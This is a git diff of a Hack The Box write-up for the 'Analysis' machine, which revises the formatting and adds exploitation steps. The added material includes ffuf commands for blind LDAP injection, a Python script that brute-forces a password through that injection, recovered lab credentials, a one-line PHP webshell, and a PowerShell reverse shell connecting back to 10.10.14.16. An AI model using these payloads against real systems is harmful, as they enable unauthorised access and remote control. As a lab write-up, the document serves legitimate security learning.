@@ -371,7 +371,7 @@ badam                   [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 
 
 It seems that we have 3 users that we could maybe use to login to the portal. We can put those usernames in a new list and try brute-forcing their passwords. The login portal looks let us know that employees use their email to login and not their username:
 
-![](employees_loginPHP.png){: .normal width="65%"}
+![](employees_loginPHP.png){: .normal width="85%"}
 
 
 ```bash
@@ -385,7 +385,7 @@ badam@analysis.htb
 
 We can now trying brute-forcing `/login.php`. We can find what is the appropriate string to put on the `hydra`'s `F` parameter by using some random credentials, e.g. `test:test`, to login:
 
-![](test_login_error.png){: .normal width="65%"}
+![](test_login_error.png){: .normal width="85%"}
 
 The text we should put there is not the "*Wrong Data*" string, but what is hidden in the source code as the **class label**, i.e., "*text-danger*":
 
@@ -403,11 +403,11 @@ $ hydra -L mailList_reduced -P /usr/share/wordlists/rockyou.txt internal.analysi
 
 According to [Varonis](https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap#:~:text=An%20LDAP%20query%20is%20a,%3DYourDomain%2CDC%3Dcom): 
 
-**LDAP (Lightweight Directory Access Protocol)** is an open and cross platform **protocol used for directory services authentication** and **provides the communication language that applications use to communicate with other directory services servers**. 
+_**LDAP (Lightweight Directory Access Protocol)** is an open and cross platform protocol used for directory services authentication and provides the communication language that applications use to communicate with other directory services servers._ 
 
-> _**Directory services** store the users, passwords, and computer accounts, and share that information with other entities on the network._
+> **Directory services** store the users, passwords, and computer accounts, and share that information with other entities on the network.
 
-In layman's terms: **LDAP is a way of speaking to Active Directory (AD)**.
+In layman's terms: **LDAP is a way of speaking to Active Directory (AD)** and it is used to store information about users, hosts, and many other objects.
 
 The relationship between AD and LDAP is much like the relationship between Apache and HTTP:
 
@@ -428,44 +428,96 @@ An **LDAP query is a command that asks a directory service for some information*
 
 According to the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md):
 
-The **LDAP** is used to store information about users, hosts, and many other objects. [**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by **manipulating input parameters afterwards passed to internal search**, add, and modify functions. A web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. 
+_[**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by **manipulating input parameters afterwards passed to internal search**, add, and modify functions. A web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. **The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application**._
 
-**The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application**.
+In layman's term: **LDAP Injection is a [syntax-weird](https://en.wikipedia.org/wiki/Polish_notation) SQLi**. 
 
-> [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
+> [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection).
+
+We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz the `description` parameter. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
 
 ```bash
 # performing LDAP injection manually
 $ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00"  -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+
+9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 385ms]
+
+$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=9FUZZ*))%00"  -w /usr/share/wordlists/
+seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+
+7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
+
+$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=97FUZZ*))%00"  -w /usr/share/wordlists/
+seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+
+N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
 ```
 
-- The above works until it hits the `*`.
-- How did we enumerate the `description` field?
+- How did we enumerate the `description` field and how we figured out that the password was there?
+- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack.
 
-> Creds: `technician:97NTtl*4QP96Bv`
+The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is used to brute-force `technician`'s password:
 
-After logging into the portal, we notice that we can upload files to it via the "*SOC Report*" tab:
+```python
+import argparse
+import requests
+import urllib.parse
+
+def main():
+    charset_path = "/usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt"
+    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
+    found_chars = ""
+    skip_count = 6
+    add_star = True
+    with open(charset_path, 'r') as file:
+        for char in file:
+            char = char.strip()
+            # URL encode the character
+            char_encoded = urllib.parse.quote(char)
+            # Check if '*' is found and skip the first 6 '*' characters
+            if '*' in char and skip_count > 0:
+                skip_count -= 1
+                continue
+            # Add '*' after encountering it for the first time
+            if '*' in char and add_star:
+                found_chars += char
+                print(f"[+] Found Password: {found_chars}")
+                add_star = False
+                continue
+            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
+            response = requests.get(modified_url)
+            if "technician" in response.text and response.status_code == 200:
+                found_chars += char
+                print(f"[+] Found Password: {found_chars}")
+                file.seek(0, 0)
+if __name__ == "__main__":
+    main()
+```
+
+We now have some credentials: `technician:97NTtl*4QP96Bv` which we can use to log into the portal. There is an upload functionality via the "*SOC Report*" tab:
 
 ![](revshell_upload.png)
 
-We can open a listener, upload a PHP webshell, and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):
+We can try to upload a webshell and visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier) to test its functionality. If it works, we can then open a listener and pass reveshell command through it:
 
 ```bash
 # webshell's contents
 $ cat revshell.php
 <?php system($_GET['c']); ?>
+```
 
+![](svc_web_shell.png)
+
+Now, we can open a listener and create a PowerShell-based reverse shell:
+
+```bash
 # opening a listener to catch the shell
 $ nc -lnvp 1337
 listening on [any] 1337 ...
 ```
 
-![](svc_web_shell.png)
-
-Now, we can create a PowerShell-based reverse shell, URL-encode it, and pass it as a command to our webshell:
-
 ```bash
-# our reverse PowerShell
+# our reverse PowerShell code
 $ cat revps
 powershell -ep bypass -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.16',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();"
 ```
